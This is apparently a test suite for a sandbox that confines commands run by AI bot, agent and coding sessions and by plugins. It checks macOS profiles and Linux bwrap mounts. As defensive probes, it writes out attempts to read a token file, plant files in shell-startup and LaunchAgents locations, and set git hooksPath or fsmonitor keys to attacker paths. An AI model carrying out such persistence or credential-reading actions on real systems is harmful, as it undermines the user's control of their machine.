import { describe, expect, test } from "bun:test";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, readlinkSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import type { Caller } from "@waifucave/clover-protocol";
import { fenceContextFor, policyAllows } from "../../src/contracts/fence";
import { CloverFence } from "../../src/fence/fence";
import { fencedSpawner, includeTargets, mkdirNoLinks, ownRepoHooks, repoConfigFiles, revertPlantedGitKeys, writeLocked } from "../../src/fence/fenced-process";
import { bwrapArgs, bwrapPlan, heldFolderNote } from "../../src/fence/linux-bwrap";
import { unixSocketFilter } from "../../src/fence/seccomp";
import { macFenceProfile } from "../../src/fence/macos-profile";
import { callerPlaces } from "../../src/fence/per-caller";
import type { FencedRun, FencedRunResult } from "../../src/fence/spawn";
import { darwinDescribe } from "../helpers/darwin-only";

const mac = process.platform === "darwin" && existsSync("/usr/bin/sandbox-exec");
const linuxBwrap = process.platform === "linux" && existsSync("/usr/bin/bwrap")
  && Bun.spawnSync(["/usr/bin/bwrap", "--ro-bind", "/", "/", "--dev", "/dev", "--proc", "/proc", "--unshare-net", "--unshare-pid", "/bin/true"]).exitCode === 0;
const here = process.platform === "darwin" ? "macos" : "linux";

const botCaller = (bot: string, sessionId: string): Caller => ({ kind: "session", sessionId, sessionKind: "bot", bot });

function world() {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-")));
  const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), outside = join(root, "outside");
  for (const d of [join(clover, "settings"), join(clover, "run"), join(clover, "plugins-state", "oks"), join(home, "project"), temp, outside]) mkdirSync(d, { recursive: true });
  writeFileSync(join(clover, "settings.json"), "orig");
  writeFileSync(join(clover, "run", "token"), "secret-ish");
  const fence = new CloverFence({ os: here, home, cloverHome: clover, temp });
  const spawner = fencedSpawner({ fence });
  const run = (command: string, who: FencedRun["who"] = { caller: { kind: "session", sessionId: "c1", sessionKind: "coding" } }) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 15_000, who });
  return { root, home, clover, temp, outside, fence, spawner, run };
}

function worldBot() {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-")));
  const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), outside = join(root, "outside");
  for (const d of [join(clover, "settings"), join(clover, "run"), join(clover, "plugins-state", "oks"), join(home, "project"), temp, outside]) mkdirSync(d, { recursive: true });
  writeFileSync(join(clover, "settings.json"), "orig");
  writeFileSync(join(clover, "run", "token"), "secret-ish");
  const fence = new CloverFence({ os: here, home, cloverHome: clover, temp });
  const spawner = fencedSpawner({ fence });
  // A bot's own session (main conversation or side thread)
  const run = (command: string, who: FencedRun["who"] = { caller: botCaller("luna", "s1") }) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 15_000, who });
  return { root, home, clover, temp, outside, fence, spawner, run };
}

const ok = (r: FencedRunResult) => r.kind === "exited" && r.code === 0;

describe("the macOS profile, as text", () => {
  test("Clover home default-deny first; holder folders; outside naming; specific fenced denies", () => {
    // Policy matching the real fence: Clover home in denyWrite/denyRead for default-deny,
    // plus specific fenced items, one of them outside the home.
    const p = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, policy: {
      allowWrite: ["/U/me", "/tmp/x"],
      denyWrite: ["/U/me/.clover/settings.json", "/U/me/.clover/plugins-state/oks", "/U/me/.clover", "/U/me/Library/LaunchAgents/com.waifucave.clover.core.plist"],
      denyRead: ["/U/me/.clover/run", "/U/me/.clover"],
      closedDoors: ["open", "launchctl", "osascript"], blockedAddresses: [], network: "none" } });
    const at = (s: string) => p.indexOf(s);
    // Strings stored in variables to avoid TypeScript parser issues with parentheses in string literals.
    const denyCloverHome = '(deny file-write* (subpath "/U/me/.clover")';
    const allowWriteSubpath = '(allow file-write* (subpath';
    const denyHomeLiteral = '(deny file-write* (literal "/U/me")';
    const denySettingsJson = '(subpath "/U/me/.clover/settings.json")';
    const denyPluginsStateOks = '(subpath "/U/me/.clover/plugins-state/oks")';
    const denyLaunchAgentsPlist = '(subpath "/U/me/Library/LaunchAgents/com.waifucave.clover.core.plist")';
    const denyRunSubpath = '(deny file-read* (subpath "/U/me/.clover/run")';
    // 1. Clover home default-deny (subpath) comes after allowWrite
    expect(at(denyCloverHome)).toBeGreaterThan(at(allowWriteSubpath));
    // 2. Holder folder denies (literal) come after the Clover home deny (and after the naming allows, below)
    expect(at(denyHomeLiteral)).toBeGreaterThan(at(denyCloverHome)); // renaming home moves Clover home
    expect(p).not.toContain('(literal "/U")'); // above writable roots nothing writable
    // 3. No naming handling for folders inside the Clover home: the home deny refuses every new name there.
    expect(p).not.toContain("clover/plugins-state/[ -.0-~]");
    expect(p).not.toContain("clover/sdk/[ -.0-~]");
    // Naming handling only outside the home (the login places): deny non-ASCII names, then allow ASCII ones.
    const nameLaunchAgentsDeny = '(deny file-write* (regex #"^/U/me/Library/LaunchAgents/[^/]"))';
    const nameLaunchAgentsAllow = '(allow file-write* (regex #"^/U/me/Library/LaunchAgents/[ -.0-~]+(/|$)"))';
    expect(p).toContain(nameLaunchAgentsDeny);
    // Holder folders' literal denies come after the naming allows (#392's review): a naming folder's ASCII-name allow
    // (`~` holding a missing `.zshrc`) would otherwise take a holder's own entry (`~/Library`) back, and it could be
    // renamed away and replaced.
    expect(at(denyHomeLiteral)).toBeGreaterThan(at(nameLaunchAgentsAllow));
    expect(at('(deny file-write* (literal "/U/me/Library")')).toBeGreaterThan(at(nameLaunchAgentsAllow));
    // 4. Specific fenced item denies come AFTER naming folder allows so they can't be overridden by them.
    expect(at(denySettingsJson)).toBeGreaterThan(at(nameLaunchAgentsAllow));
    expect(at(denyPluginsStateOks)).toBeGreaterThan(at(nameLaunchAgentsAllow));
    expect(at(denyLaunchAgentsPlist)).toBeGreaterThan(at(nameLaunchAgentsAllow));
    expect(p).toContain(denyRunSubpath);
    expect(p).toContain('(allow file-read* (subpath "/U/me/.clover/git-template"))'); // Clover's empty git template reads
    expect(p).toContain('(deny process-exec (literal "/usr/bin/open") (literal "/bin/launchctl") (literal "/usr/bin/osascript"))');
    expect(p.trim().endsWith("(deny network*)")).toBe(true);
  });

  test("naming allows come before the home deny in effect, and never reach inside it", () => {
    // A fenced item directly under /U would make /U a naming folder that contains the home: skipped.
    const p = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, policy: {
      allowWrite: ["/U/me"], denyWrite: ["/U/me/.clover", "/U/x"], denyRead: ["/U/me/.clover"],
      closedDoors: [], blockedAddresses: [], network: "none" } });
    expect(p).not.toContain('(regex #"^/U/[^/]")');
    expect(p).not.toContain('(regex #"^/U/[ -.0-~]');
  });

  test("no naming rules for a fenced item's folder outside every writable root (#321's review)", () => {
    const p = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, policy: {
      allowWrite: ["/U/me"], denyWrite: ["/U/me/.clover", "/opt/homebrew/lib/node_modules/@openai/codex", "/U/me/Library/LaunchAgents"],
      denyRead: ["/U/me/.clover"], closedDoors: [], blockedAddresses: [], network: "none" } });
    expect(p).not.toContain("node_modules/@openai/[");
    expect(p).not.toContain('(allow file-write* (regex #"^/opt/');
    expect(p).toContain('(allow file-write* (regex #"^/U/me/Library/[ -.0-~]+(/|$)"))'); // inside the root: as before
  });

  test("the caller's rules: its own folders read and write after the denies; the home stays denied otherwise", () => {
    const caller = callerPlaces("/U/me/.clover", "macos", { sessionId: "s1", memoryOf: "luna" });
    const p = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, caller, policy: {
      allowWrite: ["/U/me"], denyWrite: ["/U/me/.clover"], denyRead: ["/U/me/.clover"],
      closedDoors: [], blockedAddresses: [], network: "none" } });
    const at = (s: string) => p.indexOf(s);
    const homeDeny = '(deny file-write* (subpath "/U/me/.clover")';
    const allowOwnBot = '(allow file-read* (regex #"^/U/me/\\.clover/bots/luna(/|$)"))';
    const allowMemoryRw = '(allow file-read* file-write* (regex #"^/U/me/\\.clover/bots/luna/memory/"))';
    const denyMemoryWrite = '(deny file-write* (literal "/U/me/.clover/bots/luna/memory"))';
    // The owner's bot folder reads, its memory reads and writes (but never over itself), after the home deny.
    expect(at(allowOwnBot)).toBeGreaterThan(at(homeDeny));
    expect(at(allowMemoryRw)).toBeGreaterThan(at(homeDeny));
    expect(at(denyMemoryWrite)).toBeGreaterThan(at(allowMemoryRw));
    // Its session's outputs, its scratch and its routines read and write too.
    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/outputs/s1/"))');
    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/scratch/luna/"))');
    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/routines/luna/"))');
    // No plugin-data allow: this runner is no plugin.
    expect(p).not.toContain("plugin-data");
    // A runner that is a coding session gets its outputs, and no bot folder, memory, scratch or routines.
    const someoneElse = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, policy: {
      allowWrite: ["/U/me"], denyWrite: [], denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" },
      caller: callerPlaces("/U/me/.clover", "macos", { sessionId: "c1" }) });
    expect(someoneElse).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/outputs/c1/"))');
    expect(someoneElse).not.toContain("/U/me/\\.clover/bots/");
    expect(someoneElse).not.toContain("/U/me/\\.clover/scratch/");
    expect(someoneElse).not.toContain("/U/me/\\.clover/routines/");
  });
});

darwinDescribe("macOS: everything a command starts ends with its run, before the git keys are looked at (#321's review)", () => {
  // The process holder, built here from the agent runtime's own source (lane M ships it beside the core).
  // Built on first use, inside a test: a describe body runs on every OS (only its tests are skipped), and Linux
  // has no /usr/bin/clang to spawn.
  let built: { path: string | undefined } | undefined;
  const holderBin = (): string | undefined => {
    if (built) return built.path;
    built = { path: undefined };
    let src: string;
    try { src = join(dirname(Bun.resolveSync("@waifucave/clover-agent-runtime/package.json", import.meta.dir)), "native", "process-holder.c"); } catch { return undefined; }
    if (!existsSync(src)) return undefined;
    const out = join(realpathSync(mkdtempSync(join(tmpdir(), "clover-holder-bin-"))), "clover-process-holder");
    try { if (Bun.spawnSync(["/usr/bin/clang", "-O2", "-o", out, src]).exitCode === 0) built.path = out; } catch { /* no compiler */ }
    return built.path;
  };
  const sleeping = (tag: string) => Bun.spawnSync(["/usr/bin/pgrep", "-f", `sleep 2\\.${tag}`]).exitCode === 0;

  for (const mode of ["the recorded tree (no holder)", "the process holder"] as const) {
    test(`a \`set -m\` job that sets core.hooksPath after the run: ended, and the key never lands (${mode})`, async () => {
      const holder = mode === "the process holder" ? holderBin() : null;
      if (mode === "the process holder") expect(holder).toBeDefined();
      const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-setm-")));
      const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), project = join(home, "project");
      for (const d of [clover, project, temp]) mkdirSync(d, { recursive: true });
      expect(Bun.spawnSync(["git", "init", "-q", project]).exitCode).toBe(0);
      const fence = new CloverFence({ os: "macos", home, cloverHome: clover, temp });
      const spawner = fencedSpawner({ fence, processHolder: holder ?? null });
      const tag = `${Date.now() % 100000}${Math.floor(Math.random() * 10)}`;
      const started = Date.now();
      const r = await spawner.run({
        command: `set -m; (sleep 2.${tag}; git config core.hooksPath /tmp/y) > /dev/null 2>&1 & echo started`,
        cwd: project, env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 15_000, who: { caller: { kind: "session", sessionId: "s-setm", sessionKind: "coding" } },
      });
      expect(r.kind === "exited" && r.stdout).toBe("started\n");
      expect(Date.now() - started).toBeLessThan(2_000); // the run didn't wait for the job: it ended it
      expect(sleeping(tag)).toBe(false); // nothing left behind
      await Bun.sleep(3_000); // past when the job would have written
      expect(readFileSync(join(project, ".git", "config"), "utf8")).not.toContain("hooksPath");
      expect(sleeping(tag)).toBe(false);
    }, 30_000);
  }

  test("the second line: a key set after a run ended is reverted when the turn or session ends", async () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-recheck-")));
    const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), project = join(home, "project");
    for (const d of [clover, project, temp]) mkdirSync(d, { recursive: true });
    expect(Bun.spawnSync(["git", "init", "-q", project]).exitCode).toBe(0);
    const spawner = fencedSpawner({ fence: new CloverFence({ os: "macos", home, cloverHome: clover, temp }), processHolder: null });
    expect(ok(await spawner.run({ command: "true", cwd: project, env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 15_000, who: { caller: { kind: "session", sessionId: "s-re", sessionKind: "coding" } } }))).toBe(true);
    const config = join(project, ".git", "config");
    const before = readFileSync(config, "utf8");
    // Something that slipped past both (stood for by a write from here) sets a risky key, and an ordinary one.
    writeFileSync(config, `${before}[core]\n\tfsmonitor = /tmp/evil\n[user]\n\temail = x@y.io\n`);
    expect(spawner.recheck!("s-re")).toMatch(/core\.fsmonitor/);
    const now = readFileSync(config, "utf8");
    expect(now).not.toContain("fsmonitor");
    expect(now).toContain("x@y.io");
    expect(spawner.recheck!("s-re", { end: true })).toBeNull(); // nothing new
    expect(spawner.recheck!("s-re")).toBeNull(); // forgotten
    expect(spawner.recheck!("never-ran")).toBeNull();
  }, 30_000);
});

darwinDescribe("a fenced item outside every writable root, on the real sandbox (#321's review)", () => {
  test("a write beside it is refused, as everything outside the roots is", async () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-out-")));
    const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp");
    const modules = join(root, "global", "lib", "node_modules"), install = join(modules, "@openai", "codex");
    for (const d of [clover, join(home, "project"), temp, install]) mkdirSync(d, { recursive: true });
    const fence = new CloverFence({ os: "macos", home, cloverHome: clover, temp, agentInstalls: [install] });
    expect(fence.policy().denyWrite).toContain(install);
    const spawner = fencedSpawner({ fence });
    const run = (command: string) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 15_000, who: { caller: { kind: "session", sessionId: "c1", sessionKind: "coding" } } });
    for (const target of [join(modules, "@openai", "other.js"), join(modules, "evil.js"), join(install, "index.js")]) {
      const r = await run(`echo x > '${target}'`);
      expect([target, r.kind === "exited" && r.code !== 0, existsSync(target)]).toEqual([target, true, false]);
    }
    expect(ok(await run(`echo x > '${join(home, "project", "fine.txt")}'`))).toBe(true);
  });
});

darwinDescribe("the profile agrees with policyAllows, on the real sandbox", () => {
  test("read, write, create and delete, for each caller kind", async () => {
    const callers: Caller[] = [
      { kind: "session", sessionId: "s1", sessionKind: "bot", bot: "luna" },
      { kind: "session", sessionId: "t1", sessionKind: "side-thread", bot: "luna" },
      { kind: "session", sessionId: "a1", sessionKind: "agent", bot: "luna" },
      { kind: "session", sessionId: "c1", sessionKind: "coding" },
      { kind: "session", sessionId: "s9", sessionKind: "bot", bot: "alpha" },
      { kind: "plugin", pluginId: "tarot" },
    ];
    for (const caller of callers) {
      const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-equiv-")));
      try {
        const home = join(root, "home"), clover = join(home, ".clover");
        const sid = caller.kind === "session" ? caller.sessionId : "nobody";
        const bseg = caller.kind === "session" && (caller.sessionKind === "bot" || caller.sessionKind === "side-thread") ? caller.bot!.replace("/", "--") : null;
        const ownScratch = bseg === null ? join(clover, "scratch", "luna") : join(clover, "scratch", bseg);
        const ownRoutines = bseg === null ? join(clover, "routines", "luna") : join(clover, "routines", bseg);
        const ownOutputs = join(clover, "outputs", sid);
        const ownPluginData = caller.kind === "plugin" ? join(clover, "plugin-data", String(caller.pluginId).replace("/", "--")) : join(clover, "plugin-data", "tarot");
        const dirs = [join(clover, "run"), join(clover, "plugins-state", "oks"), join(clover, "sessions-runtime"), join(clover, "projects", "k"),
          join(clover, "bots", "luna", "memory"), join(clover, "bots", "luna", "agents"), join(clover, "bots", "sol", "memory"),
          join(clover, "bots", "alpha", "memory"), join(home, "project"), join(clover, "sdk"),
          join(clover, "scratch", "luna"), join(clover, "scratch", "alpha"),
          join(clover, "routines", "luna"), join(clover, "routines", "alpha"),
          join(clover, "plugin-data", "tarot"), join(clover, "plugin-data", "luna"), ownOutputs,
          join(home, "Library", "LaunchAgents"),
          join(home, ".ssh"), join(home, "bin"), join(home, ".local", "bin"),
          join(home, ".config", "git"), join(home, ".config", "fish", "conf.d"),
          join(home, ".config", "environment.d"), join(home, ".config", "plasma-workspace", "env"),
          join(home, ".vim"), join(home, ".config", "nvim"), join(home, ".gnupg"),
          join(home, ".config", "pip"), join(home, ".bun", "bin"), join(home, ".cargo", "bin"),
          join(home, ".oh-my-zsh", "custom"), join(home, "Library", "Preferences"), join(home, "Library", "Scripts"),
          join(home, "project", ".git", "hooks")];
        for (const d of dirs) mkdirSync(d, { recursive: true });
        const files: Record<string, string> = {
          [join(clover, "settings.json")]: "s", [join(clover, "run", "tok")]: "t",
          [join(clover, "bots", "luna", "memory", "MEMORY.md")]: "l", [join(clover, "bots", "luna", "agents", "t.json")]: "{}",
          [join(clover, "bots", "sol", "memory", "MEMORY.md")]: "s", [join(clover, "sessions-runtime", "rt.json")]: "{}",
          [join(clover, "projects", "k", "s.jsonl")]: "{}", [join(home, "project", "a.txt")]: "a",
          [join(home, "project", "del.txt")]: "d", [join(ownOutputs, "r.md")]: "r", [join(ownOutputs, "del.md")]: "d",
        };
        for (const [p, c] of Object.entries(files)) writeFileSync(p, c);
        const fence = new CloverFence({ os: "macos", home, cloverHome: clover, temp: join(root, "tmp") });
        const ctx = fenceContextFor(caller);
        const policy = fence.policy(ctx);
        const profile = macFenceProfile({ policy, cloverHome: clover, home, perUserTemp: null, caller: callerPlaces(clover, "macos", ctx) });
        type Probe = { shell: string; op: "read" | "write" | "unlink"; path: string };
        const P: Probe[] = [
          { shell: `cat '${join(clover, "settings.json")}'`, op: "read", path: join(clover, "settings.json") },
          { shell: `echo x >> '${join(clover, "settings.json")}'`, op: "write", path: join(clover, "settings.json") },
          { shell: `cat '${join(clover, "run", "tok")}'`, op: "read", path: join(clover, "run", "tok") },
          { shell: `cat '${join(clover, "bots", "luna", "agents", "t.json")}'`, op: "read", path: join(clover, "bots", "luna", "agents", "t.json") },
          { shell: `echo x >> '${join(clover, "bots", "luna", "agents", "t.json")}'`, op: "write", path: join(clover, "bots", "luna", "agents", "t.json") },
          { shell: `echo x > '${join(clover, "bots", "luna", "agents", "new.json")}'`, op: "write", path: join(clover, "bots", "luna", "agents", "new.json") },
          { shell: `cat '${join(clover, "bots", "luna", "memory", "MEMORY.md")}'`, op: "read", path: join(clover, "bots", "luna", "memory", "MEMORY.md") },
          { shell: `echo x >> '${join(clover, "bots", "luna", "memory", "MEMORY.md")}'`, op: "write", path: join(clover, "bots", "luna", "memory", "MEMORY.md") },
          { shell: `echo x > '${join(clover, "bots", "luna", "memory", "new.md")}'`, op: "write", path: join(clover, "bots", "luna", "memory", "new.md") },
          { shell: `rm '${join(clover, "bots", "luna", "memory", "MEMORY.md")}'`, op: "unlink", path: join(clover, "bots", "luna", "memory", "MEMORY.md") },
          { shell: `cat '${join(clover, "bots", "sol", "memory", "MEMORY.md")}'`, op: "read", path: join(clover, "bots", "sol", "memory", "MEMORY.md") },
          { shell: `ls '${join(clover, "bots")}'`, op: "read", path: join(clover, "bots") },
          { shell: `cat '${join(clover, "projects", "k", "s.jsonl")}'`, op: "read", path: join(clover, "projects", "k", "s.jsonl") },
          { shell: `cat '${join(clover, "sessions-runtime", "rt.json")}'`, op: "read", path: join(clover, "sessions-runtime", "rt.json") },
          { shell: `echo x > '${join(clover, "plugins-state", "evil")}'`, op: "write", path: join(clover, "plugins-state", "evil") },
          { shell: `echo x > '${join(clover, "sdk", "evil")}'`, op: "write", path: join(clover, "sdk", "evil") },
          { shell: `cat '${join(home, "project", "a.txt")}'`, op: "read", path: join(home, "project", "a.txt") },
          { shell: `echo x >> '${join(home, "project", "a.txt")}'`, op: "write", path: join(home, "project", "a.txt") },
          { shell: `echo x > '${join(home, "project", "new.txt")}'`, op: "write", path: join(home, "project", "new.txt") },
          { shell: `rm '${join(home, "project", "del.txt")}'`, op: "unlink", path: join(home, "project", "del.txt") },
          { shell: `cat '${join(ownOutputs, "r.md")}'`, op: "read", path: join(ownOutputs, "r.md") },
          { shell: `echo x >> '${join(ownOutputs, "r.md")}'`, op: "write", path: join(ownOutputs, "r.md") },
          { shell: `echo x > '${join(ownOutputs, "new.md")}'`, op: "write", path: join(ownOutputs, "new.md") },
          { shell: `rm '${join(ownOutputs, "del.md")}'`, op: "unlink", path: join(ownOutputs, "del.md") },
          { shell: `rmdir '${ownOutputs}'`, op: "unlink", path: ownOutputs },
          { shell: `ls '${ownOutputs}'`, op: "read", path: ownOutputs },
          { shell: `echo x > '${join(ownScratch, "new.md")}'`, op: "write", path: join(ownScratch, "new.md") },
          { shell: `echo x > '${join(ownRoutines, "new.md")}'`, op: "write", path: join(ownRoutines, "new.md") },
          { shell: `echo x > '${join(ownPluginData, "new.json")}'`, op: "write", path: join(ownPluginData, "new.json") },
          { shell: `echo x > '${join(clover, "plugin-data", "luna", "new.json")}'`, op: "write", path: join(clover, "plugin-data", "luna", "new.json") },
          { shell: `echo x > '${join(home, ".zshrc")}'`, op: "write", path: join(home, ".zshrc") },
          { shell: `echo x > '${join(home, ".bash_logout")}'`, op: "write", path: join(home, ".bash_logout") },
          { shell: `echo x > '${join(home, ".zlogout")}'`, op: "write", path: join(home, ".zlogout") },
          { shell: `echo x > '${join(home, ".gitconfig")}'`, op: "write", path: join(home, ".gitconfig") },
          { shell: `echo x > '${join(home, ".config", "git", "config")}'`, op: "write", path: join(home, ".config", "git", "config") },
          { shell: `echo x > '${join(home, ".ssh", "config")}'`, op: "write", path: join(home, ".ssh", "config") },
          { shell: `echo x > '${join(home, "bin", "evil")}'`, op: "write", path: join(home, "bin", "evil") },
          { shell: `echo x > '${join(home, ".local", "bin", "evil")}'`, op: "write", path: join(home, ".local", "bin", "evil") },
          { shell: `echo x > '${join(home, ".config", "fish", "conf.d", "evil.fish")}'`, op: "write", path: join(home, ".config", "fish", "conf.d", "evil.fish") },
          { shell: `echo x > '${join(home, ".config", "environment.d", "evil.conf")}'`, op: "write", path: join(home, ".config", "environment.d", "evil.conf") },
          { shell: `echo x > '${join(home, ".config", "plasma-workspace", "env", "evil.sh")}'`, op: "write", path: join(home, ".config", "plasma-workspace", "env", "evil.sh") },
          { shell: `echo x > '${join(home, "Library", "LaunchAgents", "evil.plist")}'`, op: "write", path: join(home, "Library", "LaunchAgents", "evil.plist") },
          { shell: `echo x > '${join(home, ".vimrc")}'`, op: "write", path: join(home, ".vimrc") },
          { shell: `echo x > '${join(home, ".vim", "evil.vim")}'`, op: "write", path: join(home, ".vim", "evil.vim") },
          { shell: `echo x > '${join(home, ".config", "nvim", "evil.lua")}'`, op: "write", path: join(home, ".config", "nvim", "evil.lua") },
          { shell: `echo x > '${join(home, ".emacs")}'`, op: "write", path: join(home, ".emacs") },
          { shell: `echo x > '${join(home, ".gnupg", "gpg.conf")}'`, op: "write", path: join(home, ".gnupg", "gpg.conf") },
          { shell: `echo x > '${join(home, ".config", "pip", "evil.conf")}'`, op: "write", path: join(home, ".config", "pip", "evil.conf") },
          { shell: `echo x > '${join(home, ".bunfig.toml")}'`, op: "write", path: join(home, ".bunfig.toml") },
          { shell: `echo x > '${join(home, ".bun", "bin", "evil")}'`, op: "write", path: join(home, ".bun", "bin", "evil") },
          { shell: `echo x > '${join(home, ".npmrc")}'`, op: "write", path: join(home, ".npmrc") },
          { shell: `echo x > '${join(home, ".cargo", "bin", "evil")}'`, op: "write", path: join(home, ".cargo", "bin", "evil") },
          { shell: `echo x > '${join(home, ".cargo", "config.toml")}'`, op: "write", path: join(home, ".cargo", "config.toml") },
          { shell: `echo x > '${join(home, ".bash_aliases")}'`, op: "write", path: join(home, ".bash_aliases") },
          { shell: `echo x > '${join(home, ".oh-my-zsh", "custom", "evil.zsh")}'`, op: "write", path: join(home, ".oh-my-zsh", "custom", "evil.zsh") },
          { shell: `echo x > '${join(home, "Library", "Preferences", "com.apple.loginwindow.plist")}'`, op: "write", path: join(home, "Library", "Preferences", "com.apple.loginwindow.plist") },
          { shell: `echo x > '${join(home, "Library", "Scripts", "evil.sh")}'`, op: "write", path: join(home, "Library", "Scripts", "evil.sh") },
          { shell: `echo x > '${join(home, "project", ".git", "config")}'`, op: "write", path: join(home, "project", ".git", "config") },
        ];
        const script = P.map((pr, i) => `{ ${pr.shell}; } >/dev/null 2>&1; echo "${i}:$?";`).join("\n");
        const proc = Bun.spawn(["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", script], { stdout: "pipe", stderr: "pipe" });
        const out = await new Response(proc.stdout).text();
        await proc.exited;
        const codes = new Map(out.trim().split("\n").map((l) => l.split(":") as [string, string]).map(([i, c]) => [Number(i), c === "0"]));
        expect(codes.size).toBe(P.length);
        for (const [i, pr] of P.entries()) {
          const expected = policyAllows(policy, pr.op, pr.path, "macos");
          expect([caller, pr.op, pr.path, codes.get(i)]).toEqual([caller, pr.op, pr.path, expected]);
        }
      } finally { rmSync(root, { recursive: true, force: true }); }
    }
  }, 120_000);
});

describe("the Linux sandbox's mounts, as arguments", () => {
  test("a link on the way to a fenced item is held: its folder read-only, its other entries bound back, the link not (#392's review)", () => {
    const dirs = new Set(["/h", "/h/dotfiles", "/h/dotfiles/sub", "/h/p", "/h/.clover", "/t"]);
    const files = new Set(["/h/dotfiles/notes.md"]);
    const links = new Set(["/h/dotfiles/gitconfig"]);
    const fs = {
      kind: (p: string) => (dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : links.has(p) ? "other" as const : null),
      list: (d: string) => [...dirs, ...files, ...links].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
    };
    const policy = { allowWrite: ["/h", "/t"], denyWrite: ["/h/dotfiles2/real", "/h/.clover"], denyRead: ["/h/.clover"], holdLinks: ["/h/dotfiles/gitconfig"],
      closedDoors: [], blockedAddresses: [], network: "none" as const };
    const plan = bwrapPlan({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, policy });
    const s = plan.args.join(" ");
    expect(s).toContain("--ro-bind /h/dotfiles /h/dotfiles");
    expect(s).toContain("--bind /h/dotfiles/notes.md /h/dotfiles/notes.md");
    expect(s).toContain("--bind /h/dotfiles/sub /h/dotfiles/sub");
    expect(s).not.toContain("--bind /h/dotfiles/gitconfig");
    expect(plan.held).toContainEqual({ folder: "/h/dotfiles", because: "/h/dotfiles/gitconfig" });
  });

  test("the folders above a held link are mount points: a deep ~/a/b/c/gitconfig can't have ~/a/b renamed (#392's review)", () => {
    const dirs = new Set(["/h", "/h/a", "/h/a/b", "/h/a/b/c", "/h/a/x", "/h/p", "/h/.clover", "/t"]);
    const links = new Set(["/h/a/b/c/gitconfig"]);
    const fs = {
      kind: (p: string) => (dirs.has(p) ? "dir" as const : links.has(p) ? "other" as const : null),
      list: (d: string) => [...dirs, ...links].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
    };
    const policy = { allowWrite: ["/h", "/t"], denyWrite: ["/h/real/deep", "/h/.clover"], denyRead: ["/h/.clover"], holdLinks: ["/h/a/b/c/gitconfig"],
      closedDoors: [], blockedAddresses: [], network: "none" as const };
    const s = bwrapPlan({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, policy }).args.join(" ");
    expect(s).toContain("--bind /h/a/b /h/a/b");
    expect(s).toContain("--bind /h/a /h/a");
    expect(s).toContain("--ro-bind /h/a/b/c /h/a/b/c");
    // Shallowest first (the review's live run): `~` read-only and `~/a` bound back, then the `~/a/b` holder, then the
    // link's own folder read-only last. A later mount covers what an earlier one put below it.
    const order = ["--ro-bind /h /h ", "--bind /h/a /h/a ", "--bind /h/a/b /h/a/b ", "--ro-bind /h/a/b/c /h/a/b/c "].map((x) => `${s} `.indexOf(x));
    expect(order.every((i) => i >= 0)).toBe(true);
    expect([...order].sort((x, y) => x - y)).toEqual(order);
  });

  test("the Clover home is a tmpfs view holding nothing without a caller; outside items read-only", () => {
    const dirs = new Set(["/h", "/h/.clover", "/h/.clover/settings", "/h/.clover/run", "/h/dev", "/h/dev/luna", "/t", "/run/user/1000"]);
    const files = new Set(["/h/.clover/settings.json", "/h/.clover/notes.txt"]);
    const fs = {
      kind: (p: string) => (dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : null),
      list: (d: string) => [...dirs, ...files].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
    };
    const a = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, policy: {
      allowWrite: ["/h", "/t"], denyWrite: ["/h/.clover", "/h/.clover/settings.json", "/h/.clover/settings", "/h/dev/luna"],
      denyRead: ["/h/.clover", "/h/.clover/run"], closedDoors: ["systemd-run"], blockedAddresses: [], network: "none" } });
    const s = a.join(" ");
    expect(s.startsWith("--die-with-parent --new-session --unshare-net --unshare-pid")).toBe(true);
    expect(s).toContain("--ro-bind / / --dev /dev --proc /proc --bind /h /h --bind /t /t");
    // The home is a tmpfs view: nothing of it is bound back without a caller.
    expect(s).toContain("--tmpfs /h/.clover");
    expect(s).toContain("--remount-ro /h/.clover");
    expect(s).not.toContain("--ro-bind /h/.clover ");
